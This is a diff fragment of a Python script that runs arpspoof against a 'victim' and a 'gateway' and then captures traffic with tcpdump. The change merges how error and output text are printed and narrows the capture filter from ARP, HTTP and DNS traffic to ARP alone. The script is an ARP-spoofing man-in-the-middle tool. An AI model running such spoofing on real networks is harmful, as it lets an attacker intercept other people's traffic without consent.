@@ -39,20 +39,14 @@ victim_out, victim_err = spoof_victim_process.communicate()
 gateway_out, gateway_err = spoof_gateway_process.communicate()
 
 # Print ARP spoofing output as normal
-if victim_out:
-    print(f"Output from victim arpspoof: {victim_out.decode()}")
-if gateway_out:
-    print(f"Output from gateway arpspoof: {gateway_out.decode()}")
-
-# Print actual errors if any
-if victim_err:
-    print(f"Error in victim arpspoof: {victim_err.decode()}")
-if gateway_err:
-    print(f"Error in gateway arpspoof: {gateway_err.decode()}")
+if victim_out or victim_err:
+    print(f"Output from victim arpspoof: {victim_out.decode() or victim_err.decode()}")
+if gateway_out or gateway_err:
+    print(f"Output from gateway arpspoof: {gateway_out.decode() or gateway_err.decode()}")
 
 # Start tcpdump to capture and filter ARP packets
 print("\n📡 Capturing and analyzing ARP traffic in real-time with tcpdump:")
-tcpdump_command = ["tcpdump", "-i", "eth0", "arp", "or", "port", "80", "or", "port", "53", "-q", "-n", "-A", "-s", "0", "-c", "10"]
+tcpdump_command = ["tcpdump", "-i", "eth0", "arp", "-q", "-n", "-A", "-s", "0", "-c", "10"]
 print(f"   {' '.join(tcpdump_command)}")
 tcpdump_process = subprocess.Popen(tcpdump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
